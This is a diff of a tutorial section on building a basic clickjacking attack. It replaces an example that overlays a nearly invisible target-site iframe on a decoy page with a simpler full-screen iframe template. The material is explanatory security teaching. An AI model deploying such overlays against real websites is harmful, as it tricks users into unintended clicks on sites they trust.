@@ -7,30 +7,22 @@ So, the attacker creates their own webpage, which they place with very low opaci
 ```
 ## How to construct a basic clickjacking attack
 Clickjacking attacks use CSS to create and manipulate layers. The attacker incorporates the target website as an iframe layer overlaid on the decoy website. An example using the style tag and parameters is as follows:
-```bash
+```xml
+<!DOCTYPE html>
+<html lang="en">
 <head>
-	<style>
-		#target_website {
-			position:relative;
-			width:128px;
-			height:128px;
-			opacity:0.00001;
-			z-index:2;
-			}
-		#decoy_website {
-			position:absolute;
-			width:300px;
-			height:400px;
-			z-index:1;
-			}
-	</style>
+  <meta charset="UTF-8" />
+  <title>Simple Clickjacking</title>
+  <style>
+    iframe {
+      border: none;
+      width: 100vw;
+      height: 100vh;
+    }
+  </style>
 </head>
-...
 <body>
-	<div id="decoy_website">
-	...decoy web content here...
-	</div>
-	<iframe id="target_website" src="https://vulnerable-website.com">
-	</iframe>
+  <iframe src="http://target-site.com"></iframe>
 </body>
+</html>
 ```
